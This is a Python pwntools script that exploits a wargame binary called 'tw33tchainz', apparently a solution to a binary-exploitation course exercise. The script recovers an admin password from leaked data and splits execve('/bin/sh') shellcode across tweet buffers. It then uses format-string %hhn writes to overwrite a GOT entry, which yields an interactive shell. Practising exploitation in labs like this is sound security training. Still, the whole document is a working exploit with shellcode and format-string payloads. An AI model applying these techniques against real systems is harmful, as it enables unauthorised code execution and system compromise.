from pwn import *
import struct

TWEET = "1\n"
VIEW = "2\n"
ADMIN = "3\n"
QUIT = "5\n"
USER_PASS = "                                       \n"
JUNK = "abc\n\n"
SHELLCODE_1 = "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x90\xEB\x10\n\n"
SHELLCODE_2 = "\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80\n\n"


p = process(["/levels/project1/tw33tchainz"])

p.send(USER_PASS) # Username and password
p.readuntil("Generated Password:\n")
buf = p.read()
password = buf.split("\n")[0].decode("hex")

swap_pass = ""
for i in range(0, 16, 4):
    swap_pass += struct.pack("<I", struct.unpack(">I", password[i:i+4])[0])

username = " " * 15 + "\x00"
salt = " " * 15 + "\x00"
secret_pass = "".join([chr(((ord(swap_pass[i]) ^ ord(username[i])) - ord(salt[i])) % 0x100) for i in range(16)])

p.send(TWEET)
p.send(JUNK)

p.send(TWEET)
p.send(SHELLCODE_1)

p.send(TWEET)
p.send(SHELLCODE_2)

# [23] .got.plt          PROGBITS        0804d000
p.send(TWEET)
p.send("_\x3d\xd0\x04\x08" + "%219x" + "%8$hhn" + "\n\n")

p.send(ADMIN)
p.send(secret_pass + "\n\n")

p.send(TWEET)
p.send("_\x3c\xd0\x04\x08" + "%59x" + "%8$hhn" + "\n\n")

p.send(TWEET)
p.send(JUNK)

p.send(QUIT)
p.interactive()
